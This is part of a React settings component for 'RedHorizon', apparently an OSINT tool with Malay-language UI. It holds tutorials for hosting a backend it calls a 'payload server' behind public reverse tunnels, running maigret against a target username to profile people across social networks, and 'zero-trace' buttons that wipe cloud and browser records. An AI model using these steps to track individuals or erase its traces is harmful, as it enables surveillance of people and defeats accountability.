                                            Digunakan oleh modul Google SOCINT Studio untuk menjejak profil Instagram, X, TikTok, Facebook, Telegram, dan LinkedIn.
                                        </p>
                                        <button
                                            type="button"
                                            onClick={testGoogleCse}
                                            disabled={googleCseStatus === 'testing'}
                                            className={`px-3 py-1.5 text-xs font-bold font-mono transition-all flex items-center gap-1.5 shrink-0 border ${
                                                googleCseStatus === 'testing'
                                                    ? 'bg-amber-950/60 border-amber-500/50 text-amber-300 animate-pulse'
                                                    : googleCseStatus === 'success'
                                                    ? 'bg-emerald-950/60 border-emerald-500/50 text-emerald-300 hover:bg-emerald-900/60'
                                                    : googleCseStatus === 'fail'
                                                    ? 'bg-red-950/60 border-red-500/50 text-red-300 hover:bg-red-900/60'
                                                    : 'bg-zinc-900 border-gray-700 text-zinc-300 hover:text-white hover:border-gray-500'
                                            }`}
                                        >
                                            {googleCseStatus === 'testing' ? (
                                                <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                                            ) : (
                                                <CheckCircle2 className="w-3.5 h-3.5" />
                                            )}
                                            <span>{googleCseStatus === 'testing' ? 'MENGUJI...' : googleCseStatus === 'success' ? 'ONLINE' : 'UJI CSE'}</span>
                                        </button>
                                    </div>

                                    {googleCseMsg && (
                                        <div className={`mt-2 p-2 rounded text-[11px] border font-mono flex items-start gap-2 ${
                                            googleCseStatus === 'success' 
                                                ? 'bg-emerald-950/40 border-emerald-500/40 text-emerald-300' 
                                                : 'bg-red-950/40 border-red-500/40 text-red-300'
                                        }`}>
                                            {googleCseStatus === 'success' ? (
                                                <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0 mt-0.5" />
                                            ) : (
                                                <AlertTriangle className="w-4 h-4 text-red-400 shrink-0 mt-0.5" />
                                            )}
                                            <span className="leading-snug">{googleCseMsg}</span>
                                        </div>
                                    )}
                                </div>
                            </div>
                        </div>
                    </div>
                )}

                {activeTab === 'tutorials' && (
                    <div className="space-y-6 animate-in slide-in-from-bottom-2">
                        <div className="bg-[#111] border border-gray-800 p-4">
                            <h3 className="text-white font-bold uppercase text-sm mb-3 text-[#ff0033]">1. Setup Backend (Termux / Desktop PC)</h3>
                            <div className="bg-red-900/20 border-l-4 border-red-500 p-3 mb-4">
                                <p className="text-[11px] text-white font-bold">INFO PENTING!</p>
                                <p className="text-[10px] text-gray-300 mt-1">Sistem backend (server.cjs) ini <strong>TIDAK</strong> memaparkan antaramuka/dashboard RedHorizon di PC anda. Ia hanya server payload. <br/><br/>Anda <strong>WAJIB</strong> menggunakan RedHorizon melalui pautan AI Studio ini, dan memasukkan URL Tunnel backend anda ke dalam Settings untuk mengawalnya dari jauh.</p>
                            </div>
                            <p className="text-[10px] text-gray-400 mb-4 leading-relaxed">
                                Prosesnya hampir sama untuk PC (Windows/Linux/macOS) dan Android (Termux). Anda hanya perlu terminal.
                            </p>
                            <ol className="list-decimal pl-4 space-y-3 text-[10px] text-gray-300 leading-relaxed">
                                <li>Buka aplikasi <strong>Termux</strong> di Android, atau <strong>Command Prompt / PowerShell</strong> di PC Windows 11 anda.</li>
                                <li>Pastikan <code className="text-white">nodejs</code> dan <code className="text-white">python</code> dipasang.<br/>
                                <span className="text-gray-500">- Termux: <code className="text-green-800">pkg install nodejs python git openssh</code></span><br/>
                                <span className="text-gray-500">- Windows 11: Muat turun & install dari <a href="https://nodejs.org/" target="_blank" className="text-blue-400 underline">nodejs.org</a> dan <a href="https://www.python.org/" target="_blank" className="text-blue-400 underline">python.org</a></span><br/>
                                <span className="text-gray-500">- Ubuntu/Debian PC: <code className="text-green-800">sudo apt install nodejs python3 git</code></span><br/>
                                </li>
                                <li>Sediakan direktori dan pasang dependencies server:<br/>
                                <code className="bg-black p-1 text-green-500 block mt-1">mkdir rh-backend && cd rh-backend<br/>npm init -y && npm install express cors</code></li>
                                <li>Salin kod server dari tab <strong>Termux Uplink</strong> (klik Copy) ke fail <code className="bg-black px-1 text-white">server.cjs</code>. Anda boleh gunakan <code className="text-white">nano server.cjs</code> untuk paste.</li>
                                <li>Jalankan server menggunakan:<br/>
                                <code className="bg-black p-1 text-green-500 block mt-1">node server.cjs</code></li>
                                <li className="text-emerald-400 font-bold border-l-2 border-emerald-400 pl-2">Biarkan terminal ini berjalan (Ia akan papar 'SERVER ONLINE: Port 3000').</li>
                            </ol>
                        </div>
                        
                        <div className="bg-[#111] border border-gray-800 p-4">
                            <h3 className="text-white font-bold uppercase text-sm mb-3 text-[#ff0033]">2. Cara Dapatkan URL (Tunnel)</h3>
                            <p className="text-[10px] text-gray-400 mb-2">Untuk menyambungkan Red Horizon dari browser ke Termux/PC, anda perlukan tunnel. Buka <strong>Terminal Baru (Tab ke-2)</strong> dan biarkan server.cjs tadi terus berjalan.</p>
                            
                            <div className="space-y-4">
                                <div className="p-3 border border-gray-700 bg-white/5 rounded-sm">
                                    <p className="text-[10px] text-green-400 font-bold mb-1">Pilihan A (Localtunnel - Paling Disarankan untuk PC):</p>
                                    <div className="flex items-center gap-2 mb-2">
                                        <code className="flex-1 bg-black p-2 text-white block text-[10px] m-0">npx localtunnel --port 3000</code>
                                        <button onClick={() => copyToClipboard('npx localtunnel --port 3000')} className="bg-gray-800 hover:bg-green-500 hover:text-black p-2 transition-all" title="Copy Command">
                                            <Copy size={12}/>
                                        </button>
                                    </div>
                                    <p className="text-[10px] text-gray-400">Salin url yang dipaparkan, cth: <code className="text-yellow-400">https://xxxx.loca.lt</code></p>
                                </div>

                                <div className="p-3 border border-gray-700 bg-white/5 rounded-sm">
                                    <p className="text-[10px] text-green-400 font-bold mb-1">Pilihan B (Pinggy.io):</p>
                                    <div className="flex items-center gap-2 mb-2">
                                        <code className="flex-1 bg-black p-2 text-white block text-[10px] m-0">ssh -p 443 -R0:127.0.0.1:3000 a.pinggy.io</code>
                                        <button onClick={() => copyToClipboard('ssh -p 443 -R0:127.0.0.1:3000 a.pinggy.io')} className="bg-gray-800 hover:bg-green-500 hover:text-black p-2 transition-all" title="Copy Command">
                                            <Copy size={12}/>
                                        </button>
                                    </div>
                                    <p className="text-[10px] text-gray-400">Salin url yang dipaparkan, cth: <code className="text-yellow-400">https://rnnd-xxx.a.free.pinggy.link</code></p>
                                </div>
                                
                                <div className="p-3 border border-gray-700 bg-white/5 rounded-sm">
                                    <p className="text-[10px] text-green-400 font-bold mb-1">Pilihan C (Serveo.net - Paling Stabil):</p>
                                    <div className="flex items-center gap-2 mb-2">
                                        <code className="flex-1 bg-black p-2 text-white block text-[10px] m-0">ssh -R 80:127.0.0.1:3000 serveo.net</code>
                                        <button onClick={() => copyToClipboard('ssh -R 80:127.0.0.1:3000 serveo.net')} className="bg-gray-800 hover:bg-green-500 hover:text-black p-2 transition-all" title="Copy Command">
                                            <Copy size={12}/>
                                        </button>
                                    </div>
                                    <p className="text-[10px] text-gray-400">Salin url yang dipaparkan, cth: <code className="text-yellow-400">https://xxxx.serveo.net</code></p>
                                </div>

                                <div className="p-3 border border-gray-700 bg-white/5 rounded-sm">
                                    <p className="text-[10px] text-green-400 font-bold mb-1">Pilihan D (Localhost.run):</p>
                                    <div className="flex items-center gap-2 mb-2">
                                        <code className="flex-1 bg-black p-2 text-white block text-[10px] m-0">ssh -R 80:127.0.0.1:3000 nokey@localhost.run</code>
                                        <button onClick={() => copyToClipboard('ssh -R 80:127.0.0.1:3000 nokey@localhost.run')} className="bg-gray-800 hover:bg-green-500 hover:text-black p-2 transition-all" title="Copy Command">
                                            <Copy size={12}/>
                                        </button>
                                    </div>
                                    <p className="text-[10px] text-gray-400">Salin url yang dipaparkan, cth: <code className="text-yellow-400">https://xxxx.lhr.life</code></p>
                                </div>
                            </div>
                            
                            <p className="text-[10px] text-gray-400 mt-3 border-l-2 border-[#ff0033] pl-2">Salin salah satu URL di atas dan <strong>PASTE</strong> masuk ke dalam ruangan <i>Server URL</i> pada tab <strong>Termux Uplink</strong> di susunan Setting ini.</p>
                        </div>

                        <div className="bg-[#111] border border-gray-800 p-4">
                            <h3 className="text-white font-bold uppercase text-sm mb-3 text-[#ff0033]">Info: Proses Install Dependencies Terputus?</h3>
                            <p className="text-[10px] text-gray-400 leading-relaxed">
                                Jika sambungan terputus semasa menginstall tools (seperti sedang muat turun di Termux tetapi terhenti), <strong>usah risau</strong>. Apabila anda menyambung dan menekan semula proses run/install (atau apabila <i>Wrench / fix</i> ditekan), sistem installer seperti <code className="text-white">pip</code> atau <code className="text-white">apt/pkg</code> adalah pintar — ia akan menyemak fail yang sudah siap didownload dan <strong>akan mulakan sambungan semula</strong> dari mana ia terhenti (resume), ia <strong>TIDAK akan ulang</strong> dari 0 peratus (selagi sistem fail termux tidak dibuang). Output <i>'still running'</i> bermaksud proses pemasangan pada latar belakang di Termux masih giat bekerja atau memakan masa kerana memproses data yang berat pada chipset arm telefon bimbit anda.
                            </p>
                        </div>

                        <div className="bg-[#111] border border-gray-800 p-4">
                            <h3 className="text-white font-bold uppercase text-sm mb-3 text-[#orange-500] text-orange-500">Fix Ralat: Network Error / CORS / Connection Refused</h3>
                            <p className="text-[10px] text-gray-400 leading-relaxed">
                                Jika anda mendapat ralat <i>"network error connection refused..."</i> walaupun server sudah berjalan, bermakna tunnel anda sedang menyekat akses aplikasi.
                            </p>
                            <br/>
                            <p className="text-[10px] text-gray-400 font-bold mb-2">Cara Selesaikan (Penting):</p>
                            <ol className="list-decimal pl-4 space-y-2 text-[10px] text-gray-300 leading-relaxed">
                                <li><strong>Penyelesaian Terbaik:</strong> Guna tunnel <strong>Pinggy</strong> (<code className="text-white">ssh -p 443 -R0:localhost:3000 a.pinggy.io</code>) kerana ia tidak mempunyai sekatan halaman amaran (warning page).</li>
                                <li><strong>Jika anda guna Localhost.run:</strong> Buka tab browser baru, dan <strong>paste URL</strong> itu di tab baru tersebut. Anda akan melihat amaran keselamatan (Bypass Warning). Sila klik butang persetujuan atau <strong>"click to continue" / "I Understand"</strong> di page tersebut sehingga nampak <code className="text-green-500">{"{\"status\":\"online\"}"}</code>.</li>
                                <li>Pastikan URL yang anda letak di setting bebas dari tanda `/` di hujung URL. Contoh yang betul: <code className="text-green-400">https://xyz.a.free.pinggy.link</code></li>
                                <li><strong>Ujian Tempatan:</strong> Untuk pastikan server PC/Termux anda berfungsi, cuba buka <code className="text-white">http://localhost:3000</code> di browser PC/Telefon anda sendiri dahulu. Sepatutnya ia memaparkan <code className="text-green-500">{"{\"status\":\"online\"}"}</code>.</li>
                                <li>Kembali ke aplikasi Red Horizon ini dan klik butang <strong>TEST</strong> sekali lagi. Sambungan pasti akan berjaya (ONLINE).</li>
                            </ol>
                        </div>
                        
                        <div className="bg-[#111] border border-gray-800 p-4">
                            <h3 className="text-white font-bold uppercase text-sm mb-3 text-[#ff0033]">3. Tips: Scan Maigret Tidak Beri Output?</h3>
                            <p className="text-[10px] text-gray-400 leading-relaxed mb-2">
                                Apabila anda jalankan <code className="text-white">maigret username</code>, ia mengambil masa agak lama (2-5 minit) dan hasil di terminal selalunya berselerak. Ikut langkah ini untuk dapatkan <strong>Laporan HTML Lengkap</strong>:
                            </p>
                            <ol className="list-decimal pl-4 space-y-2 text-[10px] text-gray-300 leading-relaxed">
                                <li><strong>Run dengan format report:</strong> Taip arahan ini dalam form terminal: <br/><code className="bg-black text-green-500 p-1 block mt-1">maigret (nama_target) -a --html --txt</code></li>
                                <li><strong>Tunggu sehingga selesai:</strong> Ia akan create beberapa file report di folder backend.</li>
                                <li><strong>Link Automatik:</strong> Sistem pintar kami akan automatik mencari fail report HTML tersebut dan memaparkan satu link berwarna merah (cth: <strong>View report_target_plain.html</strong>) di penghujung laporan Terminal. Anda cuma perlu "Klik" sahaja butang tersebut untuk membuka fail.</li>
                                <li><strong>Atau URL Manual:</strong> Buka web browser anda dan taip:<br/><code className="text-gray-500 text-[10px] break-all">(URL_TUNNEL_ANDA)/files/reports/report_target_plain.html</code></li>
                            </ol>
                        </div>
                    </div>
                )}
                {activeTab === 'opsec' && (
                    <div className="space-y-5 animate-in slide-in-from-bottom-2">
                        {/* Purge status toast */}
                        {opsecPurgeStatus && (
                          <div className={`p-3 rounded-lg border text-xs font-bold flex items-center gap-2 ${
                            opsecPurgeStatus.success 
                              ? 'bg-emerald-950/90 border-emerald-500 text-emerald-200 shadow-md' 
                              : 'bg-rose-950/90 border-rose-500 text-rose-200'
                          }`}>
                            <span>{opsecPurgeStatus.success ? '✓' : '⚠️'}</span>
                            <span>{opsecPurgeStatus.msg}</span>
                          </div>
                        )}

                        <div className="bg-rose-950/20 border-l-4 border-rose-500 p-4 rounded-r-lg">
                            <h3 className="text-white font-bold uppercase text-sm mb-2 flex items-center gap-2">
                                <ShieldAlert size={16} className="text-rose-500" />
                                PROTOKOL OPSEC & ZERO-TRACE SANITIZATION
                            </h3>
                            <p className="text-[11px] text-gray-300 leading-relaxed">
                                Modul ini menguruskan pemadaman data menyeluruh sama ada dalam <strong>Firebase Firestore (Awan Kolaboratif)</strong> mahupun <strong>Storan Pelayar Tempatan</strong> (LocalStorage, SessionStorage, IndexedDB RedHorizonDB & Cache). Sesuai digunakan ketika misi selesai, pertukaran bilik operasi, atau situasi kecemasan peranti.
                            </p>
                        </div>

                        {/* SECTION 1: CLOUD FIREBASE PURGE CONTROLS */}
                        <div className="bg-black/60 p-4 border border-rose-900/50 rounded-lg space-y-4">
                            <div className="flex items-center justify-between border-b border-rose-900/30 pb-2">
                                <div className="flex items-center gap-2">
                                    <Flame size={15} className="text-rose-400" />
                                    <span className="text-xs font-black text-rose-300 uppercase tracking-wider">Pembersihan Awan (Firebase Firestore Room)</span>
                                </div>
                                <span className="text-[9px] bg-rose-500/20 text-rose-300 font-mono px-2 py-0.5 rounded font-bold border border-rose-500/30">
                                    FIRESTORE
                                </span>
                            </div>

                            {/* Target Room Input */}
                            <div>
                                <label className="block text-[10px] font-bold text-gray-300 uppercase mb-1">
                                    Kod Bilik Operasi Firestore Sasaran:
                                </label>
                                <div className="flex items-center gap-2">
                                    <input
                                        type="text"
                                        value={opsecRoomId}
                                        onChange={(e) => setOpsecRoomId(e.target.value.toUpperCase())}
                                        placeholder="OPS-RED-ALPHA"
                                        className="flex-1 bg-black border border-rose-500/40 rounded px-3 py-1.5 text-xs text-rose-100 font-mono focus:outline-none focus:border-rose-400 uppercase"
                                    />
                                    <button
                                        type="button"
                                        onClick={() => setOpsecRoomId('OPS-RED-ALPHA')}
                                        className="px-2.5 py-1.5 bg-gray-800 hover:bg-gray-700 text-gray-300 text-[10px] font-bold rounded border border-gray-700"
                                    >
                                        Lalai
                                    </button>
                                </div>
                            </div>

                            {/* Granular Cloud Actions */}
                            <div className="grid grid-cols-1 md:grid-cols-3 gap-2.5 pt-1">
                                <button
                                    type="button"
                                    disabled={opsecLoading}
                                    onClick={handleOpsecCloudMessagesPurge}
                                    className="p-3 bg-rose-950/40 hover:bg-rose-900/60 border border-rose-500/40 rounded text-left flex flex-col gap-1 transition-all group cursor-pointer disabled:opacity-50"
                                >
                                    <div className="flex items-center gap-1.5 text-rose-300 font-bold text-[10px] uppercase">
                                        <Trash2 size={12} className="text-rose-400" />
                                        <span>Padam Mesej Bilik</span>
                                    </div>
                                    <span className="text-[8.5px] text-gray-400 leading-tight">
                                        Memadam semua teks perbualan, perkongsian .rhz & lampiran di bilik Firestore ini.
                                    </span>
                                </button>

                                <button
                                    type="button"
                                    disabled={opsecLoading}
                                    onClick={handleOpsecCloudCanvasPurge}
                                    className="p-3 bg-amber-950/30 hover:bg-amber-900/50 border border-amber-500/40 rounded text-left flex flex-col gap-1 transition-all group cursor-pointer disabled:opacity-50"
                                >
                                    <div className="flex items-center gap-1.5 text-amber-300 font-bold text-[10px] uppercase">
                                        <RefreshCw size={12} className="text-amber-400" />
                                        <span>Kosongkan Canvas</span>
                                    </div>
                                    <span className="text-[8.5px] text-gray-400 leading-tight">
                                        Memadam dokumen graf nod kanvas aktif di bilik awan ini.
                                    </span>
                                </button>

                                <button
                                    type="button"
                                    disabled={opsecLoading}
                                    onClick={handleOpsecCloudRoomNuke}
                                    className="p-3 bg-rose-950/80 hover:bg-rose-900 border border-rose-500 rounded text-left flex flex-col gap-1 transition-all group cursor-pointer shadow-md disabled:opacity-50"
                                >
                                    <div className="flex items-center gap-1.5 text-white font-black text-[10px] uppercase">
                                        <Skull size={12} className="text-rose-400" />
                                        <span>Nuke Bilik Operasi</span>
                                    </div>
                                    <span className="text-[8.5px] text-rose-200 leading-tight">
                                        Memadam keseluruhan bilik termasuk mesej, canvas, dan rekod penyiasat.
                                    </span>
                                </button>
                            </div>
                        </div>

                        {/* SECTION 2: LOCAL ZERO-TRACE CLEANSE */}
                        <div className="bg-black/60 p-4 border border-cyan-900/50 rounded-lg space-y-3">
                            <div className="flex items-center justify-between border-b border-cyan-900/30 pb-2">
                                <div className="flex items-center gap-2">
                                    <HardDrive size={15} className="text-cyan-400" />
                                    <span className="text-xs font-black text-cyan-300 uppercase tracking-wider">Pembersihan Tempatan (Zero-Trace Pelayar)</span>
                                </div>
                                <span className="text-[9px] bg-cyan-500/20 text-cyan-300 font-mono px-2 py-0.5 rounded font-bold border border-cyan-500/30">
                                    CLIENT-ONLY
                                </span>
                            </div>

                            <p className="text-[10px] text-gray-400 leading-relaxed">
                                Menghapuskan LocalStorage, SessionStorage, pangkalan data IndexedDB (RedHorizonDB), dan fail cache pelayar secara selamat.
                            </p>

                            <button
                                type="button"
                                disabled={opsecLoading}
                                onClick={handleOpsecLocalPurge}
                                className="w-full py-2.5 bg-cyan-600/30 hover:bg-cyan-600 text-cyan-200 hover:text-black font-bold uppercase text-xs rounded border border-cyan-500/50 flex items-center justify-center gap-2 transition-all cursor-pointer disabled:opacity-50"
                            >
                                <ShieldCheck size={14} />
                                LAKSANAKAN ZERO-TRACE LOCAL PURGE
                            </button>
                        </div>

                        {/* SECTION 3: MASTER NUCLEAR PURGE */}
                        <div className="bg-gradient-to-r from-red-950 via-zinc-950 to-rose-950 border border-red-500/80 p-4 rounded-lg space-y-3 shadow-[0_0_20px_rgba(239,68,68,0.25)]">
                            <div className="flex items-center gap-2 text-rose-300 font-black text-xs uppercase">
                                <Skull size={16} className="text-rose-400 animate-pulse" />
                                <span>MASTER TACTICAL PURGE (TOTAL BURN: CLOUD + LOCAL)</span>
                            </div>
                            <p className="text-[10px] text-gray-300 leading-relaxed">
                                Tindakan darurat mutlak. Memadamkan bilik operasi <strong>{opsecRoomId}</strong> di Firebase Firestore DAN memadamkan seluruh storan pelayar tempatan tanpa meninggalkan sebarang jejak.
                            </p>
                            <button
                                type="button"
                                disabled={opsecLoading}
                                onClick={handleOpsecMasterPurge}
                                className="w-full bg-rose-600 hover:bg-rose-500 text-white font-black uppercase text-xs py-3 rounded tracking-widest shadow-[0_0_15px_rgba(225,29,72,0.6)] flex items-center justify-center gap-2 transition-all cursor-pointer disabled:opacity-50"
                            >
                                <Flame size={16} /> 
                                INITIATE MASTER EMERGENCY PURGE
                            </button>
                        </div>

                        <div className="bg-[#111] border border-gray-800 p-4 rounded-lg">
                            <h3 className="text-white font-bold uppercase text-xs mb-2">Privasi Data & OPSEC (At-Rest)</h3>
                            <p className="text-[10px] text-gray-400 leading-relaxed">
                                RedHorizon direka berasaskan prinsip <em>Local-First & Zero-Trust</em>. Data dan kunci API anda disimpan secara tempatan pada peranti anda. Apabila menggunakan ciri kolaboratif bilik operasi, data hanya diselaraskan dalam bilik Firestore yang anda tentukan, dan boleh dihapuskan sepenuhnya pada bila-bila masa menggunakan butang Purge di atas.
                            </p>
                        </div>
                    </div>
                )}
            </div>
        </div>

        <div className="p-4 border-t border-[#ff0033]/30 bg-black/80 flex justify-end gap-3">
            <button onClick={onClose} className="px-6 py-3 text-xs font-bold text-gray-500 hover:text-white uppercase">Cancel</button>
            <button onClick={handleSave} className="bg-[#ff0033] text-black font-black uppercase text-xs px-8 py-3 hover:bg-white transition-all shadow-[0_0_20px_rgba(255,0,51,0.4)] tracking-widest flex items-center gap-2"><Check size={14} /> Save Configuration</button>
        </div>
      </div>
    </div>
  );
};

export default SettingsModal;
